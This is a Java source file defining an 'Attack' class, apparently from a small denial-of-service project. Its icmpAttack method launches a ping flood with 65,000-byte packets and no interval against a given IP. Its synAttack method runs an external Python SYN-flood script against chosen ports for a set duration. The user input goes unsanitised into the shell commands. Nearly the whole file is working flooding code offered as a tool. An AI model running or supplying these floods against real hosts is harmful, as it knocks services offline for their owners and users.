package Base;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.Scanner;

/**
 * Created by kenzi on 11/14/16.
 */
public class Attack extends TargetData {

    public static void icmpAttack(String ip) {

        try {
            Runtime r = Runtime.getRuntime();
            // The maximum ping value (65,000 byte per pinging, without interval)
            Process p = r.exec("ping -s 65000 -i 0 " + ip);

            BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));

            String inputLine;
            while ((inputLine = in.readLine()) != null) {
                System.out.println(inputLine);
            }
            in.close();

        } catch (IOException e) {
            System.out.println("Error");
        }
    }

    public static void synAttack(String ip) {

        Scanner input = new Scanner(System.in);
        System.out.print("Enter open ports to attack after \'-a\' ex. -a 22 :");
        String portsAppend = input.nextLine();
        System.out.print("How long do you want to attack?");
        String attackDuration = String.valueOf(TargetData.getIntValue());

        String destinationIp = ip;

        String cmd = "python /Users/masaki/IdeaProjects/Dos/src/syn.py" + " -t " + destinationIp + " -d " + attackDuration + "" + portsAppend;
        System.out.println(cmd); // for testing purpose

        try {
            Runtime r = Runtime.getRuntime();
            Process p = r.exec(cmd);

            BufferedReader in = new BufferedReader(new
                    InputStreamReader(p.getInputStream()));
            String inputLine;
            while ((inputLine = in.readLine()) != null) {
                System.out.println(inputLine);
            }
            in.close();


        } catch (IOException e) {
            System.out.println(e);
        }



    }
}
